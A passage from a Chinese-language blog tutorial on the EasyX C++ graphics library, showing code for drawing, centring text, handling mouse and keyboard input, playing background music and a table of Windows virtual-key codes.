class="line"></span><br><span class="line"><span class="comment">// 居中输出文字</span></span><br><span class="line"><span class="comment">// L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集</span></span><br><span class="line"><span class="type">wchar_t</span> str[] = <span class="string">L&quot;Button&quot;</span>;</span><br><span class="line"><span class="comment">// 求字符串宽度</span></span><br><span class="line"><span class="type">int</span> width = <span class="built_in">textwidth</span>(str);</span><br><span class="line"><span class="comment">// 求字符串高度</span></span><br><span class="line"><span class="type">int</span> height = <span class="built_in">textheight</span>(str);</span><br><span class="line"><span class="comment">// 横坐标 = left + ((right - left) - width) / 2</span></span><br><span class="line"><span class="type">int</span> tx = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 纵坐标 = top + ((bottom - top) - height) / 2</span></span><br><span class="line"><span class="type">int</span> ty = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">50</span>, y = <span class="number">50</span>;</span><br><span class="line">ExMessage msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 缓冲，防止图片闪烁</span></span><br><span class="line"><span class="built_in">BeginBatchDraw</span>();</span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"><span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, &amp;img);</span><br><span class="line"><span class="built_in">fillcircle</span>(x, y, <span class="number">50</span>);</span><br><span class="line"><span class="built_in">fillroundrect</span>(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh);</span><br><span class="line"><span class="built_in">outtextxy</span>(tx, ty, str);</span><br><span class="line"><span class="comment">// 应该在这里结束批量绘图</span></span><br><span class="line"><span class="built_in">EndBatchDraw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标消息</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg, EM_MOUSE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;您刚刚在坐标(&quot;</span> &lt;&lt; msg.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; msg.y &lt;&lt; <span class="string">&quot;)按下了左键！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 键盘消息</span></span><br><span class="line"><span class="keyword">if</span> (_kbhit())</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> key = _getch();<span class="comment">// 阻塞函数，不输入一直在这里等</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (key)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">72</span>:<span class="comment">// 都代表上键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;up&quot;</span> &lt;&lt; endl;</span><br><span class="line">y -= <span class="number">5</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">80</span>:<span class="comment">// 都代表下键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;down&quot;</span> &lt;&lt; endl;</span><br><span class="line">y += <span class="number">5</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">75</span>:<span class="comment">// 都代表左键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;left&quot;</span> &lt;&lt; endl;</span><br><span class="line">x -= <span class="number">5</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">77</span>:<span class="comment">// 都代表右键</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;right&quot;</span> &lt;&lt; endl;</span><br><span class="line">x += <span class="number">5</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留窗口</span></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// 关闭窗口</span></span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="播放音乐"><a href="#播放音乐" class="headerlink" title="播放音乐"></a>播放音乐</h2><h3 id="函数-4"><a href="#函数-4" class="headerlink" title="函数"></a>函数</h3><p><img src="https://z1.ax1x.com/2023/09/17/pPhEx61.png" alt="image 20230912100910836"></p><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><p><strong>注意：<code>&lt;mmsystem.h&gt;</code>要放在<code>&lt;easyx.h&gt;</code>下方</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;easyx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span><span class="comment">// 使用_getch()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mmsystem.h&gt;</span><span class="comment">// 多媒体设备接口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;winmm.lib&quot;</span>)<span class="comment">// 加载静态库</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BGM</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 打开音乐, alias取别名</span></span><br><span class="line"><span class="built_in">mciSendString</span>(<span class="string">L&quot;open ./music/1.mp3 alias BGM&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 播放音乐，repeat重复播放</span></span><br><span class="line"><span class="built_in">mciSendString</span>(<span class="string">L&quot;play BGM repeat&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="type">int</span> right;</span><br><span class="line"><span class="type">int</span> bottom;</span><br><span class="line"><span class="type">int</span> ew;</span><br><span class="line"><span class="type">int</span> eh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">/* 窗口设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个窗口, 宽640，高480</span></span><br><span class="line"><span class="comment">// initgraph(640, 480, SHOWCONSOLE | NOCLOSE | NOMINIMIZE);</span></span><br><span class="line"><span class="built_in">initgraph</span>(<span class="number">640</span>, <span class="number">480</span>, EW_SHOWCONSOLE);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 播放音乐</span></span><br><span class="line"><span class="built_in">BGM</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置窗口标题</span></span><br><span class="line">HWND hnd = <span class="built_in">GetHWnd</span>();<span class="comment">//获取窗口句柄</span></span><br><span class="line"><span class="built_in">SetWindowText</span>(hnd, <span class="string">L&quot;欢迎来到DQY&amp;WYの小窝~&quot;</span>);<span class="comment">//设置窗口标题 第一个参数传入窗口句柄，第二个参数设置字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加载并显示图片 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 图片对象</span></span><br><span class="line">IMAGE img;</span><br><span class="line"><span class="comment">// 加载图片</span></span><br><span class="line"><span class="built_in">loadimage</span>(&amp;img, <span class="string">L&quot;./images/1.jpg&quot;</span>, <span class="number">640</span>, <span class="number">480</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条样式，设置一次影响后面所有</span></span><br><span class="line"><span class="comment">// 实线；宽度5</span></span><br><span class="line"><span class="built_in">setlinestyle</span>(PS_DASH, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置线条颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setlinecolor</span>(BROWN);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置填充颜色，设置一次影响后面所有</span></span><br><span class="line"><span class="built_in">setfillcolor</span>(YELLOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绘图</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span> fill_roundrec = &#123; <span class="number">50</span>, <span class="number">150</span>, <span class="number">150</span>, <span class="number">200</span>, <span class="number">10</span>, <span class="number">50</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文字设置 */</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">settextcolor</span>(BLACK);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字样式</span></span><br><span class="line"><span class="comment">// 高度；宽度(0: 自适应)；系统字体</span></span><br><span class="line"><span class="built_in">settextstyle</span>(<span class="number">20</span>, <span class="number">0</span>, <span class="string">L&quot;楷体&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置文字背景模式为透明</span></span><br><span class="line"><span class="built_in">setbkmode</span>(TRANSPARENT);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 居中输出文字</span></span><br><span class="line"><span class="comment">// L；TEXT()；项目-&gt;属性-&gt;高级-&gt;多字节字符集</span></span><br><span class="line"><span class="type">wchar_t</span> str[] = <span class="string">L&quot;Button&quot;</span>;</span><br><span class="line"><span class="comment">// 求字符串宽度</span></span><br><span class="line"><span class="type">int</span> width = <span class="built_in">textwidth</span>(str);</span><br><span class="line"><span class="comment">// 求字符串高度</span></span><br><span class="line"><span class="type">int</span> height = <span class="built_in">textheight</span>(str);</span><br><span class="line"><span class="comment">// 横坐标 = left + ((right - left) - width) / 2</span></span><br><span class="line"><span class="type">int</span> tx = fill_roundrec.left + (fill_roundrec.right - fill_roundrec.left - width) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">// 纵坐标 = top + ((bottom - top) - height) / 2</span></span><br><span class="line"><span class="type">int</span> ty = fill_roundrec.top + (fill_roundrec.bottom - fill_roundrec.top - height) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> x = <span class="number">50</span>, y = <span class="number">50</span>;</span><br><span class="line">ExMessage msg;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 缓冲，防止图片闪烁</span></span><br><span class="line"><span class="built_in">BeginBatchDraw</span>();</span><br><span class="line"><span class="built_in">cleardevice</span>();</span><br><span class="line"><span class="built_in">putimage</span>(<span class="number">0</span>, <span class="number">0</span>, &amp;img);</span><br><span class="line"><span class="built_in">fillcircle</span>(x, y, <span class="number">50</span>);</span><br><span class="line"><span class="built_in">fillroundrect</span>(fill_roundrec.left, fill_roundrec.top, fill_roundrec.right, fill_roundrec.bottom, fill_roundrec.ew, fill_roundrec.eh);</span><br><span class="line"><span class="built_in">outtextxy</span>(tx, ty, str);</span><br><span class="line"><span class="comment">// 应该在这里结束批量绘图</span></span><br><span class="line"><span class="built_in">EndBatchDraw</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标消息</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">peekmessage</span>(&amp;msg, EM_MOUSE))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (msg.message)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line"><span class="keyword">if</span> (msg.x &gt;= fill_roundrec.left &amp;&amp; msg.x &lt;= fill_roundrec.right &amp;&amp; msg.y &gt;= fill_roundrec.top &amp;&amp; msg.y &lt;= fill_roundrec.bottom)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;您刚刚在坐标(&quot;</span> &lt;&lt; msg.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; msg.y &lt;&lt; <span class="string">&quot;)按下了左键！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 键盘消息</span></span><br><span class="line"><span class="keyword">if</span> (_kbhit())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_UP))</span><br><span class="line">&#123;</span><br><span class="line">y--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_DOWN))</span><br><span class="line">&#123;</span><br><span class="line">y++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_LEFT))</span><br><span class="line">&#123;</span><br><span class="line">x--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">GetAsyncKeyState</span>(VK_RIGHT))</span><br><span class="line">&#123;</span><br><span class="line">x++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 保留窗口</span></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="comment">// 关闭窗口</span></span><br><span class="line"><span class="built_in">closegraph</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="按钮对应的宏"><a href="#按钮对应的宏" class="headerlink" title="按钮对应的宏"></a>按钮对应的宏</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">VK_LBUTTON             鼠标左键                      <span class="number">0x01</span></span><br><span class="line">VK_RBUTTON             鼠标右键                      <span class="number">0x02</span></span><br><span class="line">VK_CANCEL              Ctrl + Break                  <span class="number">0x03</span></span><br><span class="line">VK_MBUTTON             鼠标中键                      <span class="number">0x04</span></span><br><span class="line"></span><br><span class="line">VK_BACK                Backspace 键       <span class="number">0x08</span></span><br><span class="line">VK_TAB                 Tab 键                        <span class="number">0x09</span></span><br><span class="line"></span><br><span class="line">VK_RETURN              回车键                        <span class="number">0x0D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VK_SHIFT               Shift 键                      <span class="number">0x10</span></span><br><span class="line">VK_CONTROL             Ctrl 键                       <span class="number">0x11</span></span><br><span class="line">VK_MENU                Alt 键                 <span class="number">0x12</span></span><br><span class="line">VK_PAUSE               Pause 键                      <span class="number">0x13</span></span><br><span class="line">VK_CAPITAL             Caps Lock 键                  <span class="number">0x14</span></span><br><span class="line"></span><br><span class="line">VK_ESCAPE              Esc 键                        <span class="number">0x1B</span></span><br><span class="line"></span><br><span class="line">VK_SPACE               空格键         <span class="number">0x20</span></span><br><span class="line">VK_PRIOR               Page Up 键                    <span class="number">0x21</span></span><br><span class="line">VK_NEXT                Page Down 键                  <span class="number">0x22</span></span><br><span class="line">VK_END                 End 键                        <span class="number">0x23</span></span><br><span class="line">VK_HOME                Home 键                       <span class="number">0x24</span></span><br><span class="line">VK_LEFT                左箭头键                      <span class="number">0x25</span></span><br><span class="line">VK_UP                  上箭头键                      <span class="number">0x26</span></span><br><span class="line">VK_RIGHT               右箭头键                      <span class="number">0x27</span></span><br><span class="line">VK_DOWN                下箭头键                      <span class="number">0x28</span></span><br><span class="line">VK_SNAPSHOT            Print Screen 键               <span class="number">0x2C</span></span><br><span class="line">VK_Insert              Insert 键                     <span class="number">0x2D</span></span><br><span class="line">VK_Delete              Delete 键                     <span class="number">0x2E</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;0&#x27;</span> – <span class="string">&#x27;9&#x27;</span>             数字 <span class="number">0</span> - <span class="number">9</span>                    <span class="number">0x30</span> - <span class="number">0x39</span></span><br><span class="line"><span class="string">&#x27;A&#x27;</span> – <span class="string">&#x27;Z&#x27;</span>             字母 A - Z                    <span class="number">0x41</span> - <span class="number">0x5A</span></span><br><span class="line"></span><br><span class="line">VK_LWIN                左<span class="built_in">WinKey</span>(<span class="number">104</span>键盘才有)         <span class="number">0x5B</span></span><br><span class="line">VK_RWIN                右<span class="built_in">WinKey</span>(<span class="number">104</span>键盘才有)         <span class="number">0x5C</span></span><br><span class="line"><span class="function">VK_APPS                <span class="title">AppsKey</span><span class="params">(<span class="number">104</span>键盘才有)</span>          0x5D</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">VK_NUMPAD0            小键盘 0 键                    0x60</span></span><br><span class="line"><span class="function">VK_NUMPAD1            小键盘 1 键                    0x61</span></span><br><span class="line"><span class="function">VK_NUMPAD2            小键盘 2 键                    0x62</span></span><br><span class="line"><span class="function">VK_NUMPAD3            小键盘 3 键                    0x63</span></span><br><span class="line"><span class="function">VK_NUMPAD4            小键盘 4 键                    0x64</span></span><br><span class="line"><span class="function">VK_NUMPAD5            小键盘 5 键                    0x65</span></span><br><span class="line"><span class="function">VK_NUMPAD6            小键盘 6 键                    0x66</span></span><br><span class="line"><span class="function">VK_NUMPAD7            小键盘 7 键                    0x67</span></span><br><span class="line"><span class="function">VK_NUMPAD8            小键盘 8 键                    0x68</span></span><br><span class="line"><span class="function">VK_NUMPAD9            小键盘 9 键                    0x69</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">VK_F1 - VK_F24        功能键F1 – F24               0x70 - 0x87</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">VK_NUMLOCK            Num Lock 键                   0x90</span></span><br><span class="line"><span class="function">VK_SCROLL             Scroll Lock 键                0x91</span></span><br></pre></td></tr></table></figure><h2 id="代码整合"><a href="#代码整合" class="headerlink" title="代码整合"></a>代码整合</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;easyx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span><span class="comment">// 使用_getch()</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;mmsystem.h&gt;</span><span class="comment">// 多媒体设备接口</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;winmm.lib&quot;</span>)<span class="comment">// 加载静态库</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">round_rec</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> left;</span><br><span class="line"><span class="type">int</span> top;</span><br><span class="line"><span class="type">int</span> right;</span><br><span class="line"><span class="type">int</span> bottom;</span><br><span class="line"><span class="type">int</span> ew;</span><br><span class="line"><span class="type">int</span> eh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BGM</span><span 